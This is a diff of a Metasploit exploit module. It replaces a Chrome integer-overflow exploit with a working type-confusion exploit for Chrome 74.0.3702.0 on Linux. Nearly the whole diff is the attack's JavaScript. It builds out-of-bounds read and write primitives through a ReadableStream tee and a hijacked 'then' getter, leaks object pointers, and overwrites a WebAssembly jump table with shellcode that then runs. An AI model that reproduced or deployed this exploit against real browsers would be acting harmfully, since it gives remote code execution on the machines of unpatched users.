@@ -15,10 +15,10 @@ class MetasploitModule < Msf::Exploit::Remote
         super(
           update_info(
             info,
-            'Name'           => "Google Chrome 72.0.3626.121 / 74.0.3725.0 - 'NewFixedDoubleArray' Integer Overflow",
+            'Name'           => "Google Chrome 72.0.3626.96 / 74.0.3702.0 - 'JSPromise::TriggerPromiseReactions' Type Confusion",
             'Description'    => %q{
-              Integer Overflow at NewFixedDoubleArray
-              It was tested on Chrome Linux 74.0.3725.0 (Developer Build) (64-bit) on Ubuntu 16.04
+              'JSPromise::TriggerPromiseReactions' Type Confusion
+              It was tested on Chrome Linux 74.0.3702.0 (Developer Build) (64-bit) on Ubuntu 16.04
             },
             'License'        => MSF_LICENSE,
             'Author'         => [
@@ -29,16 +29,16 @@ class MetasploitModule < Msf::Exploit::Remote
             'Targets'        =>
               [
                 [ 'Automatic', {} ],
-                [ 'Chrome 74.0.3725.0 on Linux 64bit', { } ],
+                [ 'Chrome 74.0.3702.0 on Linux 64bit', { } ],
               ],
             'References'     =>
               [
                 [ 'CVE', '2019-????' ],         # Unknown
-                [ 'CBT', '1793' ],              # Chromium Bug Tracker (https://bugs.chromium.org/p/project-zero/issues/detail?id=1793)
-                [ 'EBD', '46748' ]              # Exploit Database (https://www.exploit-db.com/exploits/46748)
+                [ 'CBT', '931640' ],              # Chromium Bug Tracker (https://bugs.chromium.org/p/chromium/issues/detail?id=931640)
+                [ 'EBD', '46654' ]              # Exploit Database (https://www.exploit-db.com/exploits/46654)
               ],
             'Arch'           => ARCH_X86,
-            'DisclosureDate' => "Mar 5 2019",
+            'DisclosureDate' => "Feb 13 2019",
             'DefaultTarget'  => 0
           )
         )
@@ -95,76 +95,109 @@ class MetasploitModule < Msf::Exploit::Remote
       html = <<-HTML
       <body>
       <script>
+      performMicrotaskCheckpoint = () => {
+        document.createNodeIterator(document, -1, {
+          acceptNode() {
+            return NodeFilter.FILTER_ACCEPT;
+        } }).nextNode();
+      }
+
+      runOutsideMicrotasksScope = func => {
+        window.addEventListener("load", { get handleEvent() {
+          func();
+        } });
+      }
+
       let data_view = new DataView(new ArrayBuffer(8));
       reverseDword = dword => {
         data_view.setUint32(0, dword, true);
         return data_view.getUint32(0, false);
       }
-      
+
       reverseQword = qword => {
         data_view.setBigUint64(0, qword, true);
         return data_view.getBigUint64(0, false);
       }
-      
+
       floatAsQword = float => {
         data_view.setFloat64(0, float);
         return data_view.getBigUint64(0);
       }
-      
+
       qwordAsFloat = qword => {
         data_view.setBigUint64(0, qword);
         return data_view.getFloat64(0);
       }
-      
+
       let oob_access_array;
       let ptr_leak_object;
       let arbirary_access_array;
       let ptr_leak_index;
       let external_ptr_index;
-      let external_ptr_backup;
       const MARKER = 0x31337;
-      
+
       leakPtr = obj => {
         ptr_leak_object[0] = obj;
         return floatAsQword(oob_access_array[ptr_leak_index]);
       }
-      
+
       getQword = address => {
         oob_access_array[external_ptr_index] = qwordAsFloat(address);
         return arbirary_access_array[0];
-        oob_access_array[external_ptr_index] = external_ptr_backup;
       }
-      
+
       setQword = (address, value) => {
         oob_access_array[external_ptr_index] = qwordAsFloat(address);
         arbirary_access_array[0] = value;
-        oob_access_array[external_ptr_index] = external_ptr_backup;
       }
-      
+
       getField = (object_ptr, num, tagged = true) =>
         object_ptr + BigInt(num * 8 - (tagged ? 1 : 0));
-      
+
       setBytes = (address, array) => {
         for (let i = 0; i < array.length; ++i) {
           setQword(address + BigInt(i), BigInt(array[i]));
         }
       }
-      
-      triggerOob = () => {
-        array = [];
-        array.length = 0xffffffff;
+
+      // ------------------------- \\
+
+      runOutsideMicrotasksScope (() => {
+        oob_access_array = Array(16).fill(1.1);
         ptr_leak_object = {};
         arbirary_access_array = new BigUint64Array(1);
-      
-        oob_access_array = array.fill(1.1, 0x80000000 - 1, {valueOf() {
-          array.length = 32;
-          array.fill(1.1);
-          return 0x80000000;
-        }});
+        oob_access_array.length = 0;
+
+        const heap_number_to_corrupt = qwordAsFloat(0x10101010n);
+        oob_access_array[0] = 1.1;
         ptr_leak_object[0] = MARKER;
         arbirary_access_array.buffer;
-      }
-      
+
+        let stream = new ReadableStream({ start(ctr) { controller = ctr } });
+        let tee_streams = stream.tee();
+        let reader = tee_streams[0].getReader();
+        reader.read();
+        reader.read();
+        let then_counter = 0;
+
+        Object.prototype.__defineGetter__("then", function() {
+          let counter_value = ++then_counter;
+          if (counter_value == 1) {
+            controller.close();
+            performMicrotaskCheckpoint();
+            throw 0x123;
+          } else if (counter_value == 2) { 
+            throw heap_number_to_corrupt;
+          } else if (counter_value == 4) {
+            oob_access_array.length = 60;
+            
+            findOffsets();
+            runCalc();
+          }
+        });
+        reader.cancel();
+      });
+
       findOffsets = () => {
         let markerAsFloat = qwordAsFloat(BigInt(MARKER) << 32n);
         for (ptr_leak_index = 0; ptr_leak_index < oob_access_array.length;
@@ -173,7 +206,7 @@ class MetasploitModule < Msf::Exploit::Remote
             break;
           }
         }
-      
+
         let oneAsFloat = qwordAsFloat(1n << 32n);
         for (external_ptr_index = 2; external_ptr_index < oob_access_array.length;
             ++external_ptr_index) {
@@ -182,15 +215,13 @@ class MetasploitModule < Msf::Exploit::Remote
             break;
           }
         }
-      
+
         if (ptr_leak_index === oob_access_array.length ||
             external_ptr_index === oob_access_array.length) {
-          throw alert("Couldn't locate the offsets");
+          throw "Couldn't locate the offsets";
         }
-      
-        external_ptr_backup = oob_access_array[external_ptr_index];
       }
-      
+
       runCalc = () => {
         const wasm_code = new Uint8Array([
           0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
@@ -205,7 +236,7 @@ class MetasploitModule < Msf::Exploit::Remote
         const wasm_instance = new WebAssembly.Instance(
           new WebAssembly.Module(wasm_code));
         const wasm_func = wasm_instance.exports.a;
-      
+
         const shellcode = [
           0x48, 0x31, 0xf6, 0x56, 0x48, 0x8d, 0x3d, 0x32,
           0x00, 0x00, 0x00, 0x57, 0x48, 0x89, 0xe2, 0x56,
@@ -217,22 +248,12 @@ class MetasploitModule < Msf::Exploit::Remote
           0x61, 0x74, 0x6f, 0x72, 0x00, 0x44, 0x49, 0x53,
           0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x00
         ];
-      
+
         wasm_instance_ptr = leakPtr(wasm_instance);
-        console.log(wasm_instance_ptr);
-        const jump_table = getQword(getField(wasm_instance_ptr, 33));
-        console.log(jump_table);
-      
-        console.log(wasm_func);
-      
+        const jump_table = getQword(getField(wasm_instance_ptr, 32));
         setBytes(jump_table, shellcode);
         wasm_func();
       }
-      
-      triggerOob();
-      findOffsets();
-      
-      runCalc();
       </script>
       </body>
       HTML
